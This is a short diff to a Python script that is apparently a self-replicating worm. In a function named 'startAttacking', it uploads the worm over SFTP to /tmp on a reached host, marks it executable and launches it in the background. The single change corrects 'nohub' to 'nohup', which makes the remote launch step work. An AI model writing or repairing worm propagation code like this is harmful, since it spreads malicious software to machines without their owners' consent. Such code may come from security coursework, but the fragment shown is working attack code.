@@ -137,7 +137,7 @@ def startAttacking(wormLocation, isHost):
 			sftpClient = sshInfo[0].open_sftp()
 			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
 			sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
-			sshInfo[0].exec_command("nohub python /tmp/replicating_worm.py &")
+			sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
 
 		elif isHost:
 			print("Could not spread to this host: %s" %(str(Host)))
